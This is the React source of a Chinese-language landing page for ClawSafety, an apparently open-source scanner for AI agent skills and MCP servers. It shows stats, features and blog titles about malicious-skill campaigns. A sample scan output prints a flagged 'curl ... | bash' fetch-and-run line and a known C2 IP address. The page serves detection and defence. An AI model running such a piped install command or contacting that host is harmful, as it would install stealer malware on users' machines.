import Link from "next/link";

const STATS = [
  { value: "23", suffix: "+", label: "扫描规则" },
  { value: "46", suffix: "+", label: "已扫描 Skill" },
  { value: "8", suffix: "", label: "C2 IP 威胁情报" },
  { value: "900", suffix: "+", label: "已拦截威胁" },
  { value: "6", suffix: "", label: "规则类别" },
  { value: "4", suffix: "", label: "深度分析报告" },
];

const TOOLS = [
  "Claude Code", "OpenClaw", "Cursor", "Windsurf", "Codex", "Gemini",
  "Cline", "Roo", "Goose", "OpenCode", "Kilo Code", "Aider",
];

const COMPARISON = [
  {
    header: "无扫描",
    headerStyle: "text-gray-400",
    items: [
      { text: "无安全审查", bad: true },
      { text: "恶意 Skill 可自由安装", bad: true },
      { text: "出事后才发现", bad: true },
      { text: "依赖社区举报", bad: true },
    ],
  },
  {
    header: "标签扫描",
    headerStyle: "text-yellow-400",
    items: [
      { text: "安装时扫描", ok: true },
      { text: "高危发现仅显示警告", ok: true },
      { text: "无发布端扫描", bad: true },
      { text: "无 IOC 威胁情报", bad: true },
    ],
  },
  {
    header: "ClawSafety",
    headerStyle: "text-cyan-400",
    items: [
      { text: "23 条规则 + IOC 数据库深度扫描", good: true },
      { text: "A-F 评分 + 详细修复建议", good: true },
      { text: "4 大攻击活动 IOC 实时更新", good: true },
      { text: "开源 CLI + 免费使用", good: true },
    ],
  },
];

const FEATURES = [
  { icon: "🔍", title: "23 条安全规则", desc: "覆盖注入、密钥泄露、依赖风险、权限滥用、配置缺陷、威胁情报 6 大类" },
  { icon: "🛡️", title: "IOC 威胁情报库", desc: "内置 ClawHavoc、SANDWORM_MODE 等 4 大攻击活动的 C2 IP、恶意域名、文件哈希" },
  { icon: "⚡", title: "秒级扫描", desc: "Rust 编写的高性能扫描引擎，46 个 Skill 全量扫描 < 3 秒" },
  { icon: "📊", title: "A-F 安全评分", desc: "量化安全等级，从 Critical 到 Info 五级严重性，清晰可执行" },
  { icon: "🌐", title: "多平台支持", desc: "兼容 OpenClaw Skills、Claude Code Skills、MCP Server 等所有 Agent 工具格式" },
  { icon: "🆓", title: "免费开源", desc: "CLI 工具完全开源，公开仓库免费扫描，无需登录" },
];

const BLOG_POSTS = [
  { slug: "sandworm-mcp-worm", title: "SANDWORM_MODE：通过 npm 仿冒包传播的 MCP 蠕虫", tag: "供应链攻击", tagColor: "text-red-400 bg-red-400/10", date: "2026-03-23" },
  { slug: "clawhavoc-amos", title: "一人之力，677 个恶意 Skill：AMOS 窃密木马分发链", tag: "恶意软件分析", tagColor: "text-orange-400 bg-orange-400/10", date: "2026-03-22" },
  { slug: "mcp-tool-poisoning", title: "你的 MCP Server 正在读取你的 SSH Key", tag: "MCP 安全", tagColor: "text-purple-400 bg-purple-400/10", date: "2026-03-22" },
  { slug: "clawhavoc-bob-p2p", title: "假 Polymarket Skill 如何偷走你的 Solana 钱包", tag: "威胁分析", tagColor: "text-red-400 bg-red-400/10", date: "2026-03-22" },
];

export default function Home() {
  return (
    <main className="min-h-screen">
      {/* Nav */}
      <nav className="fixed top-0 w-full z-50 border-b border-white/10 bg-[#0a0a0a]/80 backdrop-blur-md">
        <div className="max-w-6xl mx-auto px-6 h-16 flex items-center justify-between">
          <Link href="/" className="text-xl font-bold">ClawSafe</Link>
          <div className="flex items-center gap-6 text-sm text-gray-400">
            <a href="#features" className="hover:text-white transition hidden md:block">功能</a>
            <a href="#compare" className="hover:text-white transition hidden md:block">对比</a>
            <Link href="/blog" className="hover:text-white transition">博客</Link>
            <Link href="/ioc" className="hover:text-white transition">IOC</Link>
            <Link href="/en" className="hover:text-white transition">EN</Link>
            <Link href="/scan" className="px-4 py-2 bg-white text-black rounded-lg font-medium hover:bg-gray-200 transition">
              开始扫描
            </Link>
          </div>
        </div>
      </nav>

      {/* Hero */}
      <section className="pt-32 pb-16 px-6">
        <div className="max-w-4xl mx-auto text-center">
          <div className="inline-block mb-6 px-4 py-1.5 rounded-full border border-red-500/30 bg-red-500/10 text-red-400 text-sm font-medium">
            ClawHavoc：1,184 个恶意 Skill，9,000+ 安装实例沦陷
          </div>
          <h1 className="text-5xl md:text-6xl font-bold tracking-tight mb-6 leading-tight">
            安装前扫描，部署前验证
            <br />
            <span className="text-transparent bg-clip-text bg-gradient-to-r from-cyan-400 to-blue-500">
              Agent Skill 安全基座
            </span>
          </h1>
          <p className="text-lg text-gray-400 mb-10 max-w-2xl mx-auto leading-relaxed">
            每个 Skill 在安装前都经过 23 条规则深度扫描和 IOC 威胁情报匹配。恶意 Skill 自动拦截，篡改行为即时发现。
          </p>

          {/* Dual CTA */}
          <div className="flex flex-col sm:flex-row gap-4 justify-center mb-6">
            <Link
              href="/scan"
              className="px-8 py-3.5 bg-white text-black rounded-lg font-semibold text-lg hover:bg-gray-200 transition"
            >
              在线扫描 Skill
            </Link>
            <a
              href="https://github.com/relaxcloud-cn/clawsafety"
              target="_blank"
              className="px-8 py-3.5 border border-white/20 rounded-lg font-semibold text-lg hover:bg-white/5 transition"
            >
              GitHub 开源
            </a>
          </div>

          {/* CLI install */}
          <div className="inline-flex items-center gap-3 px-5 py-2.5 rounded-lg border border-white/10 bg-white/5 font-mono text-sm">
            <span className="text-gray-500">$</span>
            <span>cargo install clawsafety</span>
          </div>
        </div>
      </section>

      {/* Compatible Tools */}
      <section className="py-12 px-6 border-t border-white/5">
        <div className="max-w-4xl mx-auto text-center">
          <p className="text-sm text-gray-500 mb-6">兼容你常用的 AI 工具</p>
          <div className="flex flex-wrap justify-center gap-3">
            {TOOLS.map((tool) => (
              <span key={tool} className="px-3 py-1.5 rounded-lg border border-white/10 bg-white/[0.03] text-sm text-gray-400">
                {tool}
              </span>
            ))}
          </div>
        </div>
      </section>

      {/* Stats */}
      <section className="py-16 px-6 border-t border-white/5">
        <div className="max-w-5xl mx-auto">
          <div className="grid grid-cols-2 md:grid-cols-3 lg:grid-cols-6 gap-6">
            {STATS.map((s) => (
              <div key={s.label} className="text-center">
                <div className="text-3xl font-bold text-white mb-1">
                  {s.value}<span className="text-cyan-400">{s.suffix}</span>
                </div>
                <div className="text-xs text-gray-500">{s.label}</div>
              </div>
            ))}
          </div>
        </div>
      </section>

      {/* CLI Preview */}
      <section className="py-16 px-6 border-t border-white/5">
        <div className="max-w-3xl mx-auto">
          <h2 className="text-2xl font-bold text-center mb-8">一行命令，完整报告</h2>
          <div className="bg-[#0d1117] rounded-xl border border-white/10 overflow-hidden">
            <div className="flex items-center gap-2 px-4 py-3 border-b border-white/10 bg-white/[0.02]">
              <div className="w-3 h-3 rounded-full bg-[#ff5f57]" />
              <div className="w-3 h-3 rounded-full bg-[#febc2e]" />
              <div className="w-3 h-3 rounded-full bg-[#28c840]" />
              <span className="ml-3 text-xs text-gray-500 font-mono">clawsafety scan</span>
            </div>
            <pre className="p-6 text-sm font-mono text-left overflow-x-auto leading-relaxed">
              <code>
{`$ clawsafety scan ./email-osint/

  ClawSafety v0.1.0

  Scanning: ./email-osint/
  Findings: 22

  `}<span className="text-red-400 font-bold">CRITICAL</span>{`  CS-IOC-001  检测到已知 C2 IP: 91.92.242.30
            scripts/connect.py:34

  `}<span className="text-yellow-400 font-bold">HIGH</span>{`      CS-DEP-001  不安全安装: curl piped to shell
            skill.yaml:15
            > curl -sSL https://glot.io/... | bash

  `}<span className="text-yellow-300 font-bold">MEDIUM</span>{`    CS-DEP-002  依赖版本未锁定
            requirements.txt:5
            > requests>=2.28.0

  `}<span className="text-blue-400 font-bold">MEDIUM</span>{`    CS-CFG-003  缺少权限声明
            SKILL.md

  ─────────────────────────────────
  评分: `}<span className="text-red-400 font-bold">0/100 (F)</span>{`
  Critical: 1 | High: 4 | Medium: 17
  ─────────────────────────────────`}
              </code>
            </pre>
          </div>
        </div>
      </section>

      {/* ClawHavoc Alert */}
      <section className="py-16 px-6 border-t border-white/5">
        <div className="max-w-3xl mx-auto">
          <div className="p-8 rounded-2xl border border-red-500/20 bg-red-500/5">
            <div className="flex items-start gap-4">
              <div className="text-3xl">⚠️</div>
              <div>
                <h3 className="text-xl font-bold text-red-400 mb-2">ClawHavoc 攻击活动仍在持续</h3>
                <p className="text-gray-300 mb-3 leading-relaxed">
                  2026 年 1 月至今，<strong>1,184 个恶意 Skill</strong> 在 ClawHub 上被发现。攻击者通过 SKILL.md 社工诱导安装 AMOS macOS 窃密木马，窃取密码、SSH 密钥和加密钱包。所有恶意 Skill 共用 C2 服务器 <code className="text-red-400">91.92.242.30</code>。
                </p>
                <div className="flex gap-3">
                  <Link href="/blog/clawhavoc-amos" className="text-sm text-cyan-400 hover:underline">阅读完整分析 →</Link>
                  <Link href="/ioc" className="text-sm text-gray-400 hover:underline">查看 IOC 列表 →</Link>
                </div>
              </div>
            </div>
          </div>
        </div>
      </section>

      {/* Comparison */}
      <section id="compare" className="py-20 px-6 border-t border-white/5">
        <div className="max-w-5xl mx-auto">
          <h2 className="text-3xl font-bold text-center mb-4">为什么选择 ClawSafe</h2>
          <p className="text-center text-gray-400 mb-12">标签扫描 vs 深度安全审计</p>
          <div className="grid md:grid-cols-3 gap-6">
            {COMPARISON.map((col) => (
              <div
                key={col.header}
                className={`p-6 rounded-xl border ${
                  col.header === "ClawSafety"
                    ? "border-cyan-500/30 bg-cyan-500/5"
                    : "border-white/10 bg-white/[0.02]"
                }`}
              >
                <h3 className={`text-lg font-bold mb-4 ${col.headerStyle}`}>{col.header}</h3>
                <ul className="space-y-3">
                  {col.items.map((item, i) => (
                    <li key={i} className="flex items-start gap-2 text-sm">
                      <span className={`mt-0.5 ${
                        'good' in item ? "text-green-400" : 'ok' in item ? "text-yellow-400" : "text-red-400"
                      }`}>
                        {'good' in item ? "✓" : 'ok' in item ? "~" : "✗"}
                      </span>
                      <span className="text-gray-300">{item.text}</span>
                    </li>
                  ))}
                </ul>
              </div>
            ))}
          </div>
        </div>
      </section>

      {/* Features */}
      <section id="features" className="py-20 px-6 border-t border-white/5">
        <div className="max-w-5xl mx-auto">
          <h2 className="text-3xl font-bold text-center mb-4">核心能力</h2>
          <p className="text-center text-gray-400 mb-12">从规则扫描到威胁情报，全方位覆盖 Skill 攻击面</p>
          <div className="grid md:grid-cols-2 lg:grid-cols-3 gap-6">
            {FEATURES.map((f) => (
              <div key={f.title} className="p-6 rounded-xl border border-white/10 bg-white/[0.02] hover:bg-white/[0.04] transition">
                <div className="text-2xl mb-3">{f.icon}</div>
                <h3 className="text-base font-bold mb-2">{f.title}</h3>
                <p className="text-sm text-gray-400 leading-relaxed">{f.desc}</p>
              </div>
            ))}
          </div>
        </div>
      </section>

      {/* How It Works */}
      <section className="py-20 px-6 border-t border-white/5">
        <div className="max-w-4xl mx-auto">
          <h2 className="text-3xl font-bold text-center mb-12">工作流程</h2>
          <div className="grid md:grid-cols-3 gap-8">
            <StepCard
              step="1"
              title="提交 Skill"
              desc="粘贴 GitHub URL 或上传 Skill 目录，支持 OpenClaw、Claude Code、MCP Server 等所有格式。"
            />
            <StepCard
              step="2"
              title="深度扫描"
              desc="23 条规则 + IOC 数据库自动检测。覆盖注入、密钥泄露、供应链风险、已知恶意基础设施。"
            />
            <StepCard
              step="3"
              title="安全报告"
              desc="A-F 评分 + 逐条发现 + 修复建议。支持终端彩色输出、JSON 和 SARIF 格式。"
            />
          </div>
        </div>
      </section>

      {/* Quick Start */}
      <section className="py-20 px-6 border-t border-white/5">
        <div className="max-w-3xl mx-auto">
          <h2 className="text-3xl font-bold text-center mb-12">快速开始</h2>
          <div className="space-y-6">
            <CodeBlock title="安装" code="cargo install clawsafety" />
            <CodeBlock title="扫描单个 Skill" code="clawsafety scan ./my-skill/" />
            <CodeBlock title="批量扫描" code="clawsafety scan-all ./skills/" />
            <CodeBlock title="JSON 输出（CI/CD 集成）" code="clawsafety scan ./my-skill/ --format json --fail-under 75" />
          </div>
        </div>
      </section>

      {/* Blog */}
      <section className="py-20 px-6 border-t border-white/5">
        <div className="max-w-4xl mx-auto">
          <div className="flex items-center justify-between mb-8">
            <h2 className="text-3xl font-bold">安全研究</h2>
            <Link href="/blog" className="text-sm text-cyan-400 hover:underline">查看全部 →</Link>
          </div>
          <div className="grid md:grid-cols-2 gap-6">
            {BLOG_POSTS.map((post) => (
              <Link key={post.slug} href={`/blog/${post.slug}`} className="group">
                <article className="p-5 rounded-xl border border-white/10 bg-white/[0.02] hover:bg-white/[0.04] hover:border-cyan-500/30 transition-all">
                  <div className="flex items-center gap-2 mb-3">
                    <span className={`px-2 py-0.5 rounded text-xs font-bold ${post.tagColor}`}>{post.tag}</span>
                    <span className="text-xs text-gray-500">{post.date}</span>
                  </div>
                  <h3 className="font-bold group-hover:text-cyan-400 transition leading-snug">{post.title}</h3>
                </article>
              </Link>
            ))}
          </div>
        </div>
      </section>

      {/* Final CTA */}
      <section className="py-20 px-6 border-t border-white/5">
        <div className="max-w-2xl mx-auto text-center">
          <h2 className="text-3xl font-bold mb-4">保护你的 Skill 安全</h2>
          <p className="text-gray-400 mb-8">开源免费，无需登录，即刻开始。</p>
          <div className="flex flex-col sm:flex-row gap-4 justify-center">
            <Link href="/scan" className="px-8 py-3.5 bg-white text-black rounded-lg font-semibold text-lg hover:bg-gray-200 transition">
              在线扫描
            </Link>
            <Link href="/ioc" className="px-8 py-3.5 border border-white/20 rounded-lg font-semibold text-lg hover:bg-white/5 transition">
              IOC 威胁情报
            </Link>
          </div>
        </div>
      </section>

      {/* Footer */}
      <footer className="py-10 px-6 border-t border-white/5">
        <div className="max-w-5xl mx-auto">
          <div className="flex flex-col md:flex-row justify-between items-center gap-6">
            <div className="text-center md:text-left">
              <div className="font-bold text-lg mb-1">ClawSafe</div>
              <p className="text-xs text-gray-500">Agent Skill 安全基座</p>
            </div>
            <div className="flex flex-wrap justify-center gap-6 text-sm text-gray-400">
              <Link href="/blog" className="hover:text-white transition">博客</Link>
              <Link href="/ioc" className="hover:text-white transition">IOC</Link>
              <Link href="/scan" className="hover:text-white transition">扫描</Link>
              <a href="https://github.com/relaxcloud-cn/clawsafety" target="_blank" className="hover:text-white transition">GitHub</a>
              <a href="https://yisec.ai" target="_blank" className="hover:text-white transition">YiSec</a>
            </div>
          </div>
          <div className="mt-6 text-center text-xs text-gray-600">
            &copy; 2026 弈安科技 YiSec &mdash; AI 原生安全，Agent-Native 架构先行者
          </div>
        </div>
      </footer>
    </main>
  );
}

function StepCard({ step, title, desc }: { step: string; title: string; desc: string }) {
  return (
    <div className="p-6 rounded-xl border border-white/10 bg-white/[0.02] relative">
      <div className="w-10 h-10 rounded-full bg-gradient-to-br from-cyan-400 to-blue-500 flex items-center justify-center font-bold text-lg text-white mb-4">
        {step}
      </div>
      <h3 className="text-lg font-bold mb-2">{title}</h3>
      <p className="text-sm text-gray-400 leading-relaxed">{desc}</p>
    </div>
  );
}

function CodeBlock({ title, code }: { title: string; code: string }) {
  return (
    <div className="rounded-xl border border-white/10 overflow-hidden">
      <div className="px-4 py-2 bg-white/[0.03] border-b border-white/10 text-xs text-gray-500">{title}</div>
      <div className="px-4 py-3 font-mono text-sm">
        <span className="text-gray-500">$ </span>{code}
      </div>
    </div>
  );
}
